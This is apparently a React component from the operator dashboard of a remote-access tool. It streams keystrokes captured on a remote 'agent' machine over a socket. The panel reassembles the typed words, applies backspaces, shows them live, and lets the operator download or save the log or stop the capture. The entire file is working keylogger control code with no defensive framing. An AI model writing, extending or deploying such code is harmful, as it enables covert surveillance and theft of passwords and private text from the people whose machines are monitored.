import { useEffect, useRef, useState } from 'react'
import { dashboardSocket } from '../utils/socket'

export default function KeylogPanel({ open, agentId, agentName, onClose }: { open: boolean; agentId: string; agentName: string; onClose?: () => void }) {
  const [words, setWords] = useState<string[]>([])
  const bufRef = useRef<string>('')
  const timerRef = useRef<number | null>(null)
  const lastRawRef = useRef<string>('')
  const lastTsRef = useRef<number>(0)

  useEffect(() => {
    if (!open) return
    const flush = () => {
      const w = bufRef.current.trim()
      if (w) setWords((prev) => [...prev, w])
      bufRef.current = ''
    }
    const schedule = () => {
      if (timerRef.current) window.clearTimeout(timerRef.current)
      timerRef.current = window.setTimeout(flush, 600)
    }
    const onLine = (raw: string) => {
      const s = String(raw || '')
      // Drop immediate duplicates (browser HMR or double listener edge cases)
      const now = Date.now()
      if (s === lastRawRef.current && now - lastTsRef.current < 150) {
        return
      }
      lastRawRef.current = s
      lastTsRef.current = now
      if (s.startsWith('Key.')) {
        if (s === 'Key.space' || s === 'Key.enter' || s === 'Key.tab' || s === 'Key.num_lock' || s === 'Key.media_play_pause') {
          if (timerRef.current) { window.clearTimeout(timerRef.current); timerRef.current = null }
          flush()
        } else if (s === 'Key.backspace') {
          bufRef.current = bufRef.current.slice(0, -1)
          schedule()
        }
        return
      }
      const m = s.match(/^'(.*)'$/)
      const ch = m ? m[1] : s
      if (/^[A-Za-z0-9]$/.test(ch)) {
        bufRef.current += ch
      } else {
        if (timerRef.current) { window.clearTimeout(timerRef.current); timerRef.current = null }
        flush()
      }
      schedule()
    }
    dashboardSocket.onKeylog(agentId, onLine)
    return () => {
      if (timerRef.current) window.clearTimeout(timerRef.current)
      dashboardSocket.offKeylog(agentId, onLine)
    }
  }, [agentId, open])

  return (
    <div style={{ position: 'fixed', top: 0, right: 0, bottom: 0, width: open ? 360 : 0, background: '#0f0f0f', borderLeft: '1px solid #222', overflow: 'hidden', transition: 'width 0.2s ease', zIndex: 1000 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: 10, borderBottom: '1px solid #222' }}>
        <div style={{ color: '#9efc9e' }}>Keylog • {agentName}</div>
        <div style={{ display: 'flex', gap: 6 }}>
          <button className="btn secondary" onClick={() => {
            const blob = new Blob([words.join('\n') + '\n'], { type: 'text/plain;charset=utf-8' })
            const url = URL.createObjectURL(blob)
            const a = document.createElement('a'); a.href = url; a.download = `keylog-${agentId}-${Date.now()}.txt`; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url)
          }}>Download</button>
          <button className="btn secondary" onClick={() => { try { import('../utils/keylogs').then(mod => mod.saveKeylog(agentId, agentName, words)); } catch {} }}>Save</button>
          <button className="btn secondary" onClick={() => { setWords([]); bufRef.current=''; }}>Clear</button>
          <button className="btn" onClick={() => { try { dashboardSocket.stopKeylog(agentId) } catch {}; onClose && onClose() }}>Close</button>
        </div>
      </div>
      <div style={{ padding: 10, overflowY: 'auto', height: 'calc(100% - 48px)' }}>
        {words.length === 0 && (<div style={{ color: '#777' }}>(no events)</div>)}
        {words.map((w, i) => (
          <div key={i} style={{ color: '#bbb', fontSize: 12, wordBreak: 'break-word' }}>{w}</div>
        ))}
      </div>
    </div>
  )
}
